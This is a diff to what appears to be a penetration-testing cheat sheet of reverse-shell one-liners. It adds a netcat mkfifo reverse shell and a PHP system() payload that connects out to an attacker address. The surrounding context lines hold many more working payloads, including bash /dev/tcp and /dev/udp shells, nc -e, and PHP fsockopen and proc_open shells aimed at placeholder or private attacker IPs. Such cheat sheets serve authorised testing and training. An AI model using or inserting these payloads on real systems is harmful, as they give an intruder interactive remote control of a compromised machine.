@@ -39,6 +39,9 @@ bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
 exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
 
+ # Netcat OpenBsd (work if modern systems disable `-e` due to security reasons)
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f 
+
 #Short and bypass (credits to Dikline)
 (sh)0>/dev/tcp/10.10.10.10/9091
 #after getting the previous shell to get the output to execute
@@ -131,7 +134,7 @@ Then, you can just **send commands** or even **use the `upgrade` command** to ge
 ```bash
 nc -e /bin/sh <ATTACKER-IP> <PORT>
 nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f #  Netcat OpenBsd (work if modern systems disable `-e` due to security reasons)
 nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
@@ -209,6 +212,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
 
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.38 4444 >/tmp/f"); ?> # better
 ```
 
 ## Java
